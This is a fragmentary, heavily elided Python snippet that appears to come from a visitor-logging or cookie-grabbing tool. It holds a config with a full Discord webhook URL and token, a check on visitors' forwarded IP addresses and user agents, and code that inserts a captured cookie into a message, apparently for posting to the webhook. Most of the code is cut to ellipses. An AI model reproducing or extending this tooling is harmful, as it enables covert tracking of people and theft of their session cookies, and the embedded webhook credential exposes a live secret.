...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1411887939885207733/BJ6bhpGJqo6BAvM4fMxOJphjhixg1h2vhvEIRAiXcusnOFBnHMhWquW6d5B9cw2ScZgy",
...
height: 100vh;
            ...
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                ...
                if config["message"]["richMessage"] and result:
                    ...
                    message = message.replace("{cookie}", str(result["cookie"]))
